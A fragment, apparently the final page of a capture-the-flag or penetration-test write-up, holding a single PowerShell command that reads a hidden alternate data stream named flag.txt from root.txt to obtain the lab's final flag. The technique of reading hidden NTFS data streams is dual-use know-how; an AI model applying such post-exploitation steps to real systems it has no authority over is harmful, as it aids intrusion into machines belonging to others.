+ powershell get-content root.txt:flag.txt
+
+                                                                                Page 46 / 46
+
